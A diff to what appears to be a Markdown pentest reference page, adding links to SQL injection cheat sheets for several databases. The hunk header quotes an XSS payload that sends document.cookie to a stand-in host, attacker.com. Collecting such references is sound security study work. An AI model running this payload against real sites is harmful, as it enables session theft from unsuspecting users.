@@ -184,3 +184,13 @@ fetch('http://attacker.com/steal?c='+document.cookie);
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
 - [XSS Hunter](https://xsshunter.com/)
+
+### PentestMonkey Cheat Sheets
+- [Oracle SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+- [Informix SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
+- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+- [MySQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+- [Postgres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+- [DB2 SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+- [Ingres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
+- [MS Access SQLi Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
